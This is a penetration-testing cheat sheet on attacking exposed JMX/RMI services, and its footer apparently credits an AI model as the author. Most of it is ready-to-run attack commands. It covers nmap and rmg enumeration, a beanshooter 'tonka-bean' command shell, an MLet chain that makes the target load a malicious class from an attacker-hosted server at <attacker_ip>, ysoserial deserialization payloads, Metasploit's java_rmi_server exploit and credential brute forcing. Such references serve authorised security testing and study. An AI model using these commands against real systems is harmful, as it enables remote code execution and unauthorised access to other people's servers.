# JMX

#JMX #JavaManagementExtensions #Java #RMI #RCE #webservices

## What is JMX?
Java Management Extensions — Java framework for monitoring and management. Uses RMI (Remote Method Invocation) for remote access. JMX agents expose MBeans (Managed Beans) via RMI registry. If unauthenticated, attackers can invoke arbitrary MBeans including those that execute OS commands or load remote classes (MLet attack).

- Port: **TCP 1099** — RMI registry (common default)
- Port: **TCP 1098** — RMI object port
- Alternate: 7199 (Cassandra JMX), 9999, 11099 — varies by app
- Authentication: optional (often disabled)

---

## Tools

| Tool | Use |
|---|---|
| [[Tools/Scanning/NMAP\|nmap]] | `rmi-dumpregistry`, `rmi-vuln-classloader`, version detection |
| [[Tools/Web/beanshooter\|beanshooter]] | **Primary** JMX enum + attack (enum/deploy/invoke/serial/mlet, tonka-bean shell) |
| [[Tools/Web/remote-method-guesser\|remote-method-guesser]] | RMI enumeration + deserialization/method-guessing (`rmg`) |
| [[Tools/Web/jmxterm\|jmxterm]] | Scriptable CLI JMX client — browse/invoke MBeans |
| [[Tools/Web/jconsole\|jconsole]] | JDK GUI client — browse MBeans/attributes interactively |
| [[Tools/Web/mjet\|mjet]] | MOGWAI MLet remote-class-loading exploit |
| [[Tools/Payloads & Shells/ysoserial\|ysoserial]] | Java gadget-chain payloads for RMI/JMX deserialization |
| [[Tools/Payloads & Shells/metasploit\|metasploit]] | `java_rmi_server` deserialization exploit |

---

## Enumeration

```bash
# Nmap
nmap -p 1099,1098 --script rmi-dumpregistry,rmi-vuln-classloader -sV <target>
nmap -p 1099 -sV <target>

# Check if RMI registry responds
java -jar rmg.jar enum <target> 1099   # remote-method-guesser

# rlwrap + rmiregistry probe
```

---

## Connect / Access

```bash
# jconsole (GUI) — built into JDK
jconsole <target>:1099
jconsole service:jmx:rmi://<target>/jndi/rmi://<target>:1099/jmxrmi

# jmxterm (CLI tool)
# https://sourceforge.net/projects/cyclops-group/files/jmxterm/
java -jar jmxterm.jar
open <target>:1099
domains
beans

# With credentials
jconsole -J-Djava.class.path=jconsole.jar <target>:1099
```

---

## Attack Vectors

### beanshooter — enumerate + exploit (start here)

[[Tools/Web/beanshooter|beanshooter]] (qtc-de) is the modern one-stop JMX tool — it enumerates known-vulnerable MBeans, brute-forces creds, deploys its own **tonka-bean** for a command shell, and handles MLet loading and deserialization. Prefer it over hand-rolling the MLet chain below.

```bash
# Enumerate the JMX service for common vulnerabilities / accessible MBeans
beanshooter enum <target> 1099

# Deploy the tonka-bean (bundled) and run commands (its own MLet stager)
beanshooter tonka <target> 1099 exec "id"
beanshooter tonka <target> 1099 shell            # interactive command shell

# Brute-force JMX credentials if auth is on
beanshooter brute <target> 1099 --username-file users.txt --password-file pass.txt

# App-specific abuse (e.g. Tomcat's MemoryUserDatabaseMBean to add an admin, or DiagnosticCommand)
beanshooter standard <target> 1099            # dump the interesting standard MBeans
```

beanshooter also speaks **Jolokia** (HTTP-exposed JMX) — useful when JMX is reachable over `/jolokia` rather than raw RMI.

### MLet Attack (Remote Class Loading → RCE)

The MLet (Management Applet) MBean loads classes from a URL. Attackers host a malicious class file and use JMX to load and execute it.

```bash
# Prerequisites: unauthenticated JMX, outbound HTTP from target

# Step 1: Create malicious MBean
# RCEMBean.java:
# public interface RCEMBean { void exploit() throws Exception; }
# RCE.java: exec command in exploit()

# Step 2: Create MLet HTML file on attacker HTTP server
cat > mlet.html << 'EOF'
<html>
<mlet code="RCE" archive="RCE.jar" name="exploit:name=rce" codebase="http://<attacker_ip>:8080">
</mlet>
</html>
EOF

# Step 3: Host files
python3 -m http.server 8080

# Step 4: Trigger via jmxterm
open <target>:1099
bean DefaultDomain:type=MLet
run getMBeansFromURL http://<attacker_ip>:8080/mlet.html
bean exploit:name=rce
run exploit

# Automated — mjet
# https://github.com/mogwaisec/mjet
python3 mjet.py --jmxhost <target> --jmxport 1099 --attack mlet --payload_url http://<attacker_ip>:8080/mlet.html
```

### Invoke Existing MBeans

```bash
# jconsole or jmxterm — browse existing MBeans for dangerous operations
# Common dangerous MBeans:
# - DiagnosticCommand (JDK Mission Control) — arbitrary JVM commands
# - Threading — thread dumps (info disclosure)
# - ClassLoading — load classes
# - Runtime.exec equivalents in app-specific MBeans

# Via jmxterm:
open <target>:1099
domains
beans
bean <domain>:<name>
info   # list attributes/operations
run <operation> [args]
```

### Deserialization via RMI

```bash
# If RMI endpoint deserializes untrusted data:
# ysoserial + rmg (remote-method-guesser)
java -jar rmg.jar guess <target> 1099
java -jar rmg.jar call <target> 1099 <method> --payload ysoserial.CommonsCollections6 "id"

# Metasploit
use exploit/multi/misc/java_rmi_server
set RHOSTS <target>
set RPORT 1099
run
```

### JMX Brute Force (if auth enabled)

```bash
# mjet brute force
python3 mjet.py --jmxhost <target> --jmxport 1099 --attack bruteforce --usernames users.txt --passwords passwords.txt
```

### Cassandra JMX (Port 7199)

```bash
# Cassandra exposes JMX on 7199 — often with no auth
# nodetool uses JMX under the hood
nodetool -h <target> -p 7199 status
nodetool -h <target> -p 7199 info
nodetool -h <target> -p 7199 describecluster
```

---

## Dangerous Settings

| Setting | Risk |
|---|---|
| No JMX authentication | Full MBean access → RCE via MLet / tonka-bean |
| Jolokia endpoint exposed (`/jolokia`) | HTTP-reachable JMX — same MBean abuse without RMI |
| RMI registry exposed to network | Remote class loading |
| Old JVM version | Deserialization gadget chains |
| MLet available without auth | Direct remote class loading |
| App-specific dangerous MBeans | RCE via invoke |

---

## Quick Reference

| Goal | Command |
|---|---|
| Detect | `nmap -p 1099 -sV host` |
| Enum + exploit | `beanshooter enum host 1099` → `beanshooter tonka host 1099 shell` |
| RMI registry dump | `nmap -p 1099 --script rmi-dumpregistry host` |
| Connect (GUI) | `jconsole host:1099` |
| Connect (CLI) | `java -jar jmxterm.jar` → `open host:1099` |
| MLet attack | `python3 mjet.py --jmxhost host --jmxport 1099 --attack mlet --payload_url http://attacker/mlet.html` |
| MSF deserialization | `exploit/multi/misc/java_rmi_server` |
| Cassandra | `nodetool -h host -p 7199 status` |

---

> [!note] **See also** — [[Services/Web Services/Pega|Pega]] — Pega Platform's unauthenticated RCE (CVE-2022-24082) is an exposed-JMX deserialization bug exploited with the same MOGWAI `mjet` MLet technique.

---

*Created: 2026-07-13*
*Updated: 2026-09-25*
*Model: claude-opus-4-8*
